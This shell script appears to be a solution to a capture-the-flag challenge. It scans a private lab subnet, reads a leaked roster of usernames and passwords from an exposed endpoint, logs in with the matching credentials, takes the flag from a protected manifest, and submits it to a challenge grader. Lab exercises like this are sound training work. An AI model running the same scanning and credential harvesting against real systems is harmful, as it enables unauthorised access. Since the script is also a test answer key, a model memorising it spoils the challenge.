#!/bin/sh
set -eu

TARGET=172.20.0.147
nmap -Pn -p 8080 --open 172.20.0.141-199 >/dev/null
status=$(curl -fsS "http://${TARGET}:8080/ops/status")
roster=$(curl -fsS "http://${TARGET}:8080/roster.json")
credentials=$(python3 -c 'import json,sys; s=json.loads(sys.argv[1]); r=json.loads(sys.argv[2]); g=s["identity_generation"]; x=[a for a in r["records"] if a["generation"]==g]; assert len(x)==1; print(x[0]["username"]+"\n"+x[0]["password"])' "$status" "$roster")
username=$(printf '%s\n' "$credentials" | sed -n '1p')
password=$(printf '%s\n' "$credentials" | sed -n '2p')
response=$(curl -fsS -u "${username}:${password}" "http://${TARGET}:8080/crew/manifest")
flag=$(python3 -c 'import json,sys; print(json.loads(sys.argv[1])["flag"])' "$response")
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":"scl-challenge-frame-21976e","task_id":"task1","flag":sys.argv[1]},separators=(",",":")))' "$flag")"
